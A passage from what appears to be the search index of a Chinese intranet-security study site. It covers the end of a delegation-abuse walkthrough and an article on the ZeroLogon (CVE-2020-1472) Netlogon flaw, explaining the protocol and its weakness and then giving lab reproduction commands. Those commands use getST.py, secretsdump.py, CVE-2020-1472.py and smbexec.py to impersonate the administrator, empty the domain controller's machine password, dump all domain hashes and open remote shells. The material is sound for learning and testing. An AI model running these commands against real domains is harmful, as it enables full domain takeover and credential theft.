machine$\u5df2\u7ecf\u62e5\u6709\u5bf9\u57df\u63a7\u5236\u5668 AD02 \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u4e86\u3002</p> <p></p> <p>\u6b64\u65f6\u673a\u5668\u7528\u6237 machine$\u5df2\u7ecf\u62e5\u6709\u5bf9\u57df\u63a7\u5236\u5668 AD02 \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u4e86\uff0c\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u540e\u5229\u7528\uff1a</p> <pre><code>#\u4ee5 administrator \u7684\u8eab\u4efd\u7533\u8bf7\u8bbf\u95ee ad02 \u673a\u5668\u7684 cifs \u670d\u52a1\u7968\u636e\npython3 getST.py -spn cifs/ad02.xie.com xie/machine\\$:root -dc-ip 10.211.55.4 -impersonate administrator\n#\u5bfc\u5165\u7533\u8bf7\u7684\u670d\u52a1\u7968\u636e\nexport KRB5CCNAME=administrator.ccache\n#\u5bfc\u51fa\u57df\u5185\u6307\u5b9a krbtgt \u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py -k -no-pass AD02.xie.com -just-dc-user krbtgt\n#\u8fdc\u7a0b\u8fde\u63a5 ad02 \u673a\u5668\npython3 smbexec.py -no-pass -k AD02.xie.com -codec gbk\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5229\u7528\u5b8c\u6210\u540e\uff0c\u5373\u53ef\u5bfc\u51fa\u57df\u5185\u4efb\u610f\u7528\u6237\u54c8\u5e0c\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7\u5236\u5668 AD02\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#_7","title":"\u6f0f\u6d1e\u6293\u5305\u5206\u6790","text":"<p>\u73b0\u5728\u6211\u4eec\u4ee5\u653b\u51fb Exchange \u670d\u52a1\u5668\u4e3a\u4f8b\uff0c\u5229\u7528 WireShark \u6293\u5305\u5206\u6790\u6574\u4e2a\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u3002\u5982\u56fe\u6240\u793a\uff0c\u662f\u6574\u4e2a\u5229\u7528\u8fc7\u7a0b\u7684\u5206\u6790\u56fe\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html","title":"CVE-2020-1472 NetLogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e","text":"<p>\u201c Logon\u201d\u662f \u201cLog\u201d \u548c\u201con\u201d\u5408\u6210\u7684\u4e00\u4e2a\u8bcd\uff0c\u4e2d\u95f4\u6ca1\u6709\u7a7a\u683c\u548c\u95f4\u65ad\uff0c\u5b83\u7684\u610f\u601d\u662f\u201c\u767b\u5f55\u201d\u3002</p> <p>NetLogon \u662f Windows \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u6838\u5fc3\u670d\u52a1\uff0c\u4e3b\u8981\u7528\u4e8e\u5904\u7406\u7f51\u7edc\u767b\u5f55\u8fc7\u7a0b\u4e2d\u7684\u8ba4\u8bc1\u548c\u5b89\u5168\u534f\u8bae\u3002\u5b83\u8d1f\u8d23\u5728\u8ba1\u7b97\u673a\u548c\u57df\u63a7\u5236\u5668\uff08Domain Controller, DC\uff09\u4e4b\u95f4\u5efa\u7acb\u5b89\u5168\u901a\u9053\uff0c\u4ee5\u4fbf\u6267\u884c\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u3001\u8ba1\u7b97\u673a\u8eab\u4efd\u9a8c\u8bc1\u4ee5\u53ca\u5176\u4ed6\u4e0e\u57df\u76f8\u5173\u7684\u64cd\u4f5c\u3002</p> <p>\u4e3b\u8981\u529f\u80fd:</p> <ul> <li>\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u7684\u8eab\u4efd\u9a8c\u8bc1\uff1aNetLogon \u5728\u5de5\u4f5c\u7ad9\u548c\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u5efa\u7acb\u4e00\u4e2a\u5b89\u5168\u901a\u9053\uff0c\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\u3002\u5b83\u652f\u6301\u7528\u6237\u3001\u670d\u52a1\u4ee5\u53ca\u8ba1\u7b97\u673a\u4e4b\u95f4\u7684\u76f8\u4e92\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li>\u8ba1\u7b97\u673a\u542f\u52a8\u65f6\u7684\u8eab\u4efd\u9a8c\u8bc1\uff1a\u5f53\u8ba1\u7b97\u673a\u542f\u52a8\u5e76\u52a0\u5165\u5230\u57df\u65f6\uff0cNetLogon \u4f1a\u5e2e\u52a9\u8ba1\u7b97\u673a\u5411\u57df\u63a7\u5236\u5668\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4ee5\u786e\u4fdd\u8ba1\u7b97\u673a\u80fd\u5728\u57df\u4e2d\u6b63\u5e38\u5de5\u4f5c\u3002</li> <li>\u7528\u6237\u767b\u5f55\u65f6\u7684\u8eab\u4efd\u9a8c\u8bc1\uff1a\u5f53\u7528\u6237\u5c1d\u8bd5\u767b\u5f55\u5230\u57df\u4e2d\u7684\u8ba1\u7b97\u673a\u65f6\uff0cNetLogon \u4f1a\u5c06\u7528\u6237\u7684\u51ed\u636e(\u5982\u7528\u6237\u540d\u548c\u5bc6\u7801)\u53d1\u9001\u5230\u57df\u63a7\u5236\u5668\u8fdb\u884c\u9a8c\u8bc1\u3002\u57df\u63a7\u5236\u5668\u4f1a\u901a\u8fc7\u6d3b\u52a8\u76ee\u5f55(Active Directory, AD)\u68c0\u67e5\u8fd9\u4e9b\u51ed\u636e\u5e76\u8fd4\u56de\u7ed3\u679c\u3002</li> <li>\u6d3b\u52a8\u76ee\u5f55\u590d\u5236\uff1aNetLogon \u8fd8\u53c2\u4e0e\u4e86\u6d3b\u52a8\u76ee\u5f55\u7684\u590d\u5236\u8fdb\u7a0b\u3002\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u7684\u8eab\u4efd\u9a8c\u8bc1\u548c\u76ee\u5f55\u670d\u52a1\u540c\u6b65\uff08\u5982AD\u7684\u590d\u5236\uff09\u4f9d\u8d56\u4e8eNetLogon\u63d0\u4f9b\u7684\u670d\u52a1\u3002</li> <li>NTLM\uff08NT LAN Manager\uff09\u8ba4\u8bc1\u652f\u6301\uff1a\u867d\u7136 Kerberos \u662f\u73b0\u4ee3\u57df\u73af\u5883\u7684\u9996\u9009\u8ba4\u8bc1\u534f\u8bae\uff0c\u4f46 NetLogon \u4e5f\u652f\u6301 NTLM \u8ba4\u8bc1\u3002NTLM \u662f\u4e00\u79cd\u8f83\u65e7\u7684\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4ecd\u88ab\u4f7f\u7528\uff0c\u5c24\u5176\u662f\u5904\u7406\u9057\u7559\u7cfb\u7edf\u3002</li> <li>Kerberos \u7968\u636e\u670d\u52a1\uff1aNetLogon \u5e2e\u52a9\u7528\u6237\u83b7\u53d6 Kerberos \u7968\u636e\uff0c\u8fd9\u4e9b\u7968\u636e\u7528\u4e8e\u652f\u6301\u5b89\u5168\u7684\u3001\u52a0\u5bc6\u7684\u7f51\u7edc\u4f1a\u8bdd\u3002</li> </ul> <p>\u76f8\u5173\u8fdb\u7a0b:</p> <p>NetLogon \u5728\u7cfb\u7edf\u4e2d\u7684\u670d\u52a1\u540d\u79f0\u662f Netlogon\uff0c\u5b83\u4f1a\u8fd0\u884c\u5728\u57df\u63a7\u5236\u5668\u548c\u57df\u5185\u7684\u6240\u6709\u6210\u5458\u8ba1\u7b97\u673a\u4e0a\uff0c\u9ed8\u8ba4\u542f\u52a8\u7c7b\u578b\u4e3a\u81ea\u52a8\uff08\u57df\u63a7\u5236\u5668\u4e0a\uff09\u3002\u5728\u57df\u73af\u5883\u4e2d\uff0cNetLogon \u8fdb\u7a0b\uff08netlogon.dll\uff09\u5bf9\u8ba1\u7b97\u673a\u8eab\u4efd\u9a8c\u8bc1\u3001\u4fe1\u4efb\u5173\u7cfb\u7684\u5efa\u7acb\u548c\u7ef4\u62a4\u81f3\u5173\u91cd\u8981\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#_1","title":"\u6f0f\u6d1e\u80cc\u666f\u548c\u63cf\u8ff0","text":"<p>\u5728 2020 \u5e74 8 \u6708\u4efd\u5fae\u8f6f\u516c\u5e03\u7684\u5b89\u5168\u516c\u544a\u4e2d\uff0c\u6709\u4e00\u4e2a\u5341\u5206\u7d27\u6025\u7684\u6f0f\u6d1e\u2014\u2014CVE-2020-1472 NetLogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u3002\u901a\u8fc7\u8be5\u6f0f\u6d1e\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ea\u9700\u8981\u80fd\u8bbf\u95ee\u5230\u57df\u63a7\u7684 135 \u7aef\u53e3\u5373\u53ef\u901a\u8fc7 Netlogon \u8fdc\u7a0b\u534f\u8bae\u8fde\u63a5\u57df\u63a7\u5236\u5668\u5e76\u91cd\u7f6e\u57df\u63a7\u5236\u5668\u673a\u5668\u8d26\u53f7\u7684\u54c8\u5e0c\uff0c\u4ece\u800c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u57df\u63a7\u5236\u5668\u7684\u673a\u5668\u8d26\u53f7\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u54c8\u5e0c(\u57df\u63a7\u5236\u5668\u7684\u673a\u5668\u8d26\u53f7\u9ed8\u8ba4\u5177\u6709 Dcsync \u6743\u9650\uff0c\u53ef\u4ee5\u4f7f\u7528 Dcsync \u5bfc\u51fa\u57df\u5185\u54c8\u5e0c)\uff0c\u8fdb\u800c\u63a5\u7ba1\u6574\u4e2a\u57df\u3002\u8be5\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8e Netlogon \u534f\u8bae\u8ba4\u8bc1\u7684\u52a0\u5bc6\u6a21\u5757\u5b58\u5728\u7f3a\u9677\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u6ca1\u6709\u51ed\u636e\u7684\u60c5\u51b5\u4e0b\u901a\u8fc7\u8ba4\u8bc1\u3002\u901a\u8fc7\u8ba4\u8bc1\u540e\uff0c\u8c03\u7528 Netlogon\u534f\u8bae\u4e2d RPC \u51fd\u6570 NetrServerPasswordSet2 \u6765\u91cd\u7f6e\u57df\u63a7\u5236\u5668\u673a\u5668\u8d26\u53f7\u7684\u54c8\u5e0c\uff0c\u4ece\u800c\u63a5\u7ba1\u5168\u57df\uff01</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#_2","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>\u8be5\u6f0f\u6d1e\u7531 Secura \u7684\u5b89\u5168\u7814\u7a76\u5458 Tom Tervoort \u4ee5\u53ca\u56fd\u5185\u5b89\u5168\u7814\u7a76\u5458\u5f6d\u5cd9\u917f\u535a\u58eb\u3001\u674e\u96ea\u5cf0\u53d1\u73b0\u3002Tom Tervoort \u53d1\u5e03\u4e86\u5173\u4e8e\u8be5\u6f0f\u6d1e\u7684\u8be6\u7ec6\u539f\u7406\u548c\u5229\u7528\u65b9\u5f0f\u7684\u767d\u76ae\u4e66\uff0c\u5e76\u5c06\u5176\u547d\u540d\u4e3a ZeroLogon\u3002\u4e0b\u9762\u6211\u4eec\u6765\u5206\u6790\u4e0b Netlogon \u8fd0\u884c\u7684\u6d41\u7a0b\u548c\u9020\u6210\u8be5\u6f0f\u6d1e\u7684\u539f\u56e0\uff01</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#1netlogon","title":"1.Netlogon \u670d\u52a1","text":"<p>Netlogon \u670d\u52a1\u4e3a\u57df\u5185\u7684\u8eab\u4efd\u9a8c\u8bc1\u63d0\u4f9b\u4e00\u4e2a\u5b89\u5168\u901a\u9053\uff0c\u5b83\u88ab\u7528\u4e8e\u6267\u884c\u4e0e\u57df\u7528\u6237\u548c\u673a\u5668\u8eab\u4efd\u9a8c\u8bc1\u76f8\u5173\u7684\u5404\u79cd\u4efb\u52a1\uff0c\u6700\u5e38\u89c1\u7684\u662f\u8ba9\u7528\u6237\u4f7f\u7528 NTLM \u534f\u8bae\u767b\u5f55\u670d\u52a1\u5668\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNetlogon \u670d\u52a1\u5728\u57df\u5185\u6240\u6709\u673a\u5668\u540e\u53f0\u8fd0\u884c\u7740\uff0c\u8be5\u670d\u52a1\u7684\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\u4e3a<code>C:\\Windows\\system32\\lsass.exe</code>\u3002\u5982\u56fe\u6240\u793a\uff0c\u662f Netlogon \u670d\u52a1.</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#2netlogon","title":"2.Netlogon \u8ba4\u8bc1\u6d41\u7a0b","text":"<p>Neglogon \u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u4e4b\u95f4\u901a\u8fc7 <code>Microsoft Netlogon Remote Protocol(MS-NRPC)\u534f\u8bae</code>\u6765\u8fdb\u884c\u901a\u4fe1\u3002MS-NRPC \u534f\u8bae\u5e76\u6ca1\u6709\u4f7f\u7528\u4e0e\u5176\u4ed6 RPC\u534f\u8bae\u76f8\u540c\u7684\u89e3\u51b3\u65b9\u6848\u3002\u5728\u8fdb\u884c\u6b63\u5f0f\u901a\u4fe1\u4e4b\u524d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u4e4b\u95f4\u9700\u8981\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u5e76\u534f\u5546\u51fa\u4e00\u4e2a<code>Session Key</code>\uff0c\u8be5\u503c\u7528\u4e8e\u4fdd\u62a4\u53cc\u65b9\u540e\u7eed\u7684 RPC \u901a\u4fe1\u6d41\u91cf\u3002</p> <p>\u7b80\u8981\u7684 Netlogon \u8ba4\u8bc1\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u2460\uff1a\u9996\u5148\uff0c\u7531\u5ba2\u6237\u7aef\u542f\u52a8\u7f51\u7edc\u767b\u5f55\u4f1a\u8bdd\uff0c\u5ba2\u6237\u7aef\u8c03\u7528<code>NetrServerReqChallenge</code> \u51fd\u6570\u7ed9\u670d\u52a1\u7aef\u53d1\u9001\u968f\u673a\u7684 8 \u5b57\u8282 <code>Client Challenge</code> \u503c\u3002</p> <p>\u2461\uff1a\u670d\u52a1\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u9001\u7684<code>NetrServerReqChallenge</code>\u8c03\u7528\u540e\uff0c\u670d\u52a1\u7aef\u4e5f\u8c03\u7528 <code>NetrServerReqChallenge</code>\u51fd\u6570\u53d1\u9001\u968f\u673a\u7684 8 \u5b57\u8282 <code>Server Challenge</code> \u503c\u3002</p> <p>\u2462\uff1a\u6b64\u65f6\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5747\u6536\u5230\u4e86\u6765\u81ea\u5bf9\u65b9\u7684 Challenge\u3002\u7136\u540e\u53cc\u65b9\u90fd\u4f7f\u7528\u5171\u4eab\u7684\u5bc6\u94a5 secret(\u5ba2\u6237\u7aef\u673a\u5668\u8d26\u53f7\u7684\u54c8\u5e0c\u503c)\u4ee5\u53ca\u6765\u81ea\u53cc\u65b9\u7684 Challenge \u901a\u8fc7\u8ba1\u7b97\u5f97\u5230 <code>Session Key=KDF(secret,(Client Challenge+Server Challenge))</code>\u3002\u6b64\u65f6\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5747\u62e5\u6709\u4e86\u76f8\u540c\u7684 Client Challenge\u3001Server Challenge\u3001SessionKey\u3002</p> <p>\u2463\uff1a\u5ba2\u6237\u7aef\u4f7f\u7528 Session Key \u4f5c\u4e3a\u5bc6\u94a5\u52a0\u5bc6 Client Challenge \u5f97\u5230 ClientCredential \u5e76\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\u3002\u670d\u52a1\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u6765\u7684 Client Credential \u540e\uff0c\u672c\u5730\u4f7f\u7528 Session Key \u4f5c\u4e3a\u5bc6\u94a5\u52a0\u5bc6 Client Challenge \u8ba1\u7b97\u51fa Client Credential\u3002\u7136\u540e\u6bd4\u8f83\u672c\u5730\u8ba1\u7b97\u51fa\u7684 Client Credential \u548c\u4ece\u5ba2\u6237\u7aef\u53d1\u9001\u6765\u7684 Client Credential\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u4e24\u8005\u76f8\u540c\uff0c\u5219\u8bf4\u660e\u5ba2\u6237\u7aef\u62e5\u6709\u6b63\u786e\u7684\u51ed\u636e\u4ee5\u53ca Session Key\u3002</p> <p>\u2464\uff1a\u670d\u52a1\u7aef\u4f7f\u7528 Session Key \u4f5c\u4e3a\u5bc6\u94a5\u52a0\u5bc6 Server Challenge \u5f97\u5230 Server Credential \u5e76\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u5ba2\u6237\u7aef\u6536\u5230\u670d\u52a1\u7aef\u53d1\u6765\u7684 Server Credential \u540e\uff0c\u672c\u5730\u4f7f\u7528 Session Key \u4f5c\u4e3a\u5bc6\u94a5\u52a0\u5bc6 Server Challenge \u8ba1\u7b97\u51fa Server Credential\u3002\u7136\u540e\u6bd4\u8f83\u672c\u5730\u8ba1\u7b97\u51fa\u7684 Server Credential \u548c\u4ece\u670d\u52a1\u7aef\u53d1\u9001\u6765\u7684 Server Credential\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u4e24\u8005\u76f8\u540c\uff0c\u5219\u8bf4\u660e\u670d\u52a1\u7aef\u62e5\u6709\u76f8\u540c\u7684 Session Key\u3002</p> <p>\u2465\uff1a\u81f3\u6b64\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u53cc\u65b9\u4e92\u76f8\u8ba4\u8bc1\u6210\u529f\u5e76\u4e14\u62e5\u6709\u76f8\u540c\u7684 Session Key\uff0c\u6b64\u540e\u4f7f\u7528 Session Key \u6765\u52a0\u5bc6\u540e\u7eed\u7684 RPC \u901a\u4fe1\u6d41\u91cf\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#3","title":"3.\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0","text":"<p>CVE-2020-1472 \u6f0f\u6d1e\uff08\u53c8\u79f0\u4e3a Neglogon \u6f0f\u6d1e\uff09\u7684\u4ea7\u751f\u539f\u56e0\u4e3b\u8981\u662f\u7531\u4e8e Microsoft Netlogon \u8fdc\u7a0b\u534f\u8bae\uff08MS-NRPC\uff09\u5728\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u4e2d\u7f3a\u4e4f\u5bf9\u5ba2\u6237\u7aef\u548c\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u901a\u4fe1\u7684\u5f3a\u5236\u52a0\u5bc6\u548c\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002</p> <p>\u4e3b\u8981\u539f\u56e0\u5305\u62ec\uff1a</p> <ol> <li>\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u7684\u8bbe\u8ba1\u7f3a\u9677\uff1a\u5728\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 Netlogon \u534f\u8bae\u7684\u67d0\u4e9b\u5b9e\u73b0\u7ec6\u8282\uff0c\u901a\u8fc7\u53d1\u9001\u4f2a\u9020\u7684\u8eab\u4efd\u9a8c\u8bc1\u8bf7\u6c42\u6765\u5192\u5145\u57df\u63a7\u5236\u5668\uff0c\u8fdb\u800c\u83b7\u5f97\u8bbf\u95ee\u6743\u9650\u3002</li> <li>\u7f3a\u5c11\u52a0\u5bc6\uff1aNetlogon \u534f\u8bae\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u672a\u80fd\u5f3a\u5236\u4f7f\u7528\u52a0\u5bc6\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u80fd\u591f\u5728\u7f51\u7edc\u4e0a\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u52ab\u6301\u548c\u7be1\u6539\u8eab\u4efd\u9a8c\u8bc1\u8bf7\u6c42\u3002</li> <li>\u975e\u5f3a\u5236\u7684\u52a0\u5bc6\u7b97\u6cd5\uff1a\u6f0f\u6d1e\u5229\u7528\u4e86\u534f\u8bae\u4e2d\u975e\u5f3a\u5236\u52a0\u5bc6\u7b97\u6cd5\u7684\u7f3a\u9677\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7ed5\u8fc7\u8fd9\u4e9b\u673a\u5236\uff0c\u6267\u884c\u6076\u610f\u64cd\u4f5c\u800c\u4e0d\u88ab\u53d1\u73b0\u3002</li> </ol>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#_3","title":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c","text":"<ul> <li>Windows Server 2008 R2 for x64-based Systems Service Pack1</li> <li>Windows Server 2008 R2 for x64-based Systems Service Pack1 (Server Core installation)</li> <li>Windows Server 2012</li> <li>Windows Server 2012 (Server Core installation)</li> <li>Windows Server 2012 R2</li> <li>Windows Server 2012 R2 (Server Core installation) </li> <li>Windows Server 2016</li> <li>Windows Server 2016 (Server Core installation) </li> <li>Windows Server 2019</li> <li>Windows Server 2019 (Server Core installation) </li> <li>Windows Server, version 1903 (Server Core installation)</li> <li>Windows Server, version 1909 (Server Core installation)</li> <li>Windows Server, version 2004 (Server Core installation)</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u5b9e\u9a8c\u73af\u5883\u5982\u4e0b\uff1a</p> <ul> <li>\u57df\u63a7 ip\uff1a10.211.55.4</li> <li>\u57df\u63a7\u4e3b\u673a\u540d\uff1aAD01</li> </ul> <p>\u5206\u522b\u4f7f\u7528 Python \u811a\u672c\u548c mimikatz \u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u590d\u73b0\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#1-python","title":"1. Python \u811a\u672c\u590d\u73b0","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 zerologon_tester.py \u548c CVE-2020-1472.py \u811a\u672c\u5bf9 Netlogon\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u8fdb\u884c\u68c0\u6d4b\u548c\u5229\u7528\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#1","title":"\uff081\uff09\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e","text":"<p>\u9996\u5148\u4f7f\u7528 zerologon_tester.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u68c0\u6d4b\u76ee\u6807\u57df\u63a7\u662f\u5426\u5b58\u5728Netlogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u3002</p> <pre><code>python3 zerologon_tester.py AD01 10.211.55.4\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 zerologon_tester.py \u811a\u672c\u68c0\u6d4b\u76ee\u6807\u57df\u63a7\u662f\u5426\u5b58\u5728 Netlogon\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff0c\u63d0\u793a<code>Success! DC can be fully compromised by a Zerologon attack.</code>\u5373\u8bf4\u660e\u76ee\u6807\u57df\u63a7\u5b58\u5728 Netlogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#2","title":"\uff082\uff09\u91cd\u7f6e\u57df\u63a7\u54c8\u5e0c","text":"<p>\u786e\u5b9a\u76ee\u6807\u57df\u63a7\u5b58\u5728 Netlogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u540e\uff0c\u4f7f\u7528 CVE-2020-1472.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bf9\u5176\u8fdb\u884c\u653b\u51fb\u3002</p> <pre><code>#\u653b\u51fb\uff0c\u4f7f\u57df\u63a7\u7684\u673a\u5668\u8d26\u53f7\u54c8\u5e0c\u7f6e\u4e3a\u7a7a\npython3 CVE-2020-1472.py AD01 AD01$ 10.211.55.4\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 CVE-2020-1472.py \u811a\u672c\u5bf9\u57df\u63a7\u8fdb\u884c\u653b\u51fb\uff0c\u8be5\u811a\u672c\u4f1a\u5c06\u76ee\u6807\u57df\u63a7\u7684\u673a\u5668\u8d26\u53f7\u54c8\u5e0c\u7f6e\u4e3a\u7a7a\uff0c\u53ef\u4ee5\u770b\u5230\u653b\u51fb\u6210\u529f\uff01</p> <p>\u5c06\u57df\u63a7\u7684\u673a\u5668\u8d26\u53f7\u54c8\u5e0c\u7f6e\u4e3a\u7a7a\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u7ed5\u8fc7\u8eab\u4efd\u9a8c\u8bc1\uff0c\u56e0\u4e3a\u7cfb\u7edf\u5728\u9a8c\u8bc1\u65f6\u4f1a\u5931\u8d25\uff0c\u5bfc\u81f4\u57df\u63a7\u65e0\u6cd5\u8bc6\u522b\u6709\u6548\u7684\u673a\u5668\u8d26\u6237\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#3_1","title":"\uff083\uff09\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7","text":"<p>\u653b\u51fb\u6210\u529f\u540e\uff0c\u6b64\u65f6\u76ee\u6807\u57df\u63a7\u7684\u673a\u5668\u8d26\u53f7<code>AD01$</code>\u7684\u5bc6\u7801\u5df2\u7ecf\u7f6e\u4e3a\u7a7a\u4e86\u3002\u7531\u4e8e\u57df\u63a7\u673a\u5668\u8d26\u53f7\u9ed8\u8ba4\u5728\u57df\u5185\u5177\u6709 DCSync \u7684\u6743\u9650\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76ee\u6807\u57df\u63a7\u673a\u5668\u8d26\u53f7<code>AD01$</code>\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7\uff0c\u6307\u5b9a\u54c8\u5e0c\u4e3a\u7a7a\uff0c\u4f7f\u7528 secretsdump.py \u811a\u672c\u5bfc\u51fa\u57df\u5185\u4efb\u610f\u7528\u6237\u54c8\u5e0c\uff0c\u6211\u4eec\u8fd9\u91cc\u5bfc\u51fa\u57df\u7ba1\u7406\u5458 administrator \u7684\u54c8\u5e0c\u3002\u518d\u5229\u7528\u57df\u7ba1\u7406\u5458administrator \u7684\u54c8\u5e0c\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7\uff01</p> <pre><code>#\u4f7f\u7528 AD01$\u673a\u5668\u8d26\u53f7\uff0c\u54c8\u5e0c\u4e3a\u7a7a\u8fde\u63a5\uff0c\u5bfc\u51fa administrator \u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py \"xie/AD01$\"@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc-user \"administrator\"\n\n#\u7136\u540e\u7528 administrator \u7528\u6237\u7684\u54c8\u5e0c\u8fde\u63a5\u57df\u63a7\npython3 smbexec.py xie/administrator@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:33e17aa21ccc6ab0e6ff30eecb918dfb\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5bfc\u51fa\u57df\u7ba1\u7406\u5458 administrator \u7684\u54c8\u5e0c\uff0c\u5e76\u6210\u529f\u8fde\u63a5\u57df\u63a7AD01\u3002</p> <p></p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\u3002</p> <pre><code>#\u5bfc\u51fa\u6240\u6709\u7528\u6237\u54c8\u5e0c\npython3 secretsdump.py \"xie/AD01$\"@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc\n</code></pre> <p>\u5982\u56fe\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#2-mimikatz","title":"2. mimikatz \u590d\u73b0","text":"<p>\u65b0\u7248\u672c\u7684 mimikatz \u5df2\u7ecf\u96c6\u6210\u4e86 Netlogon 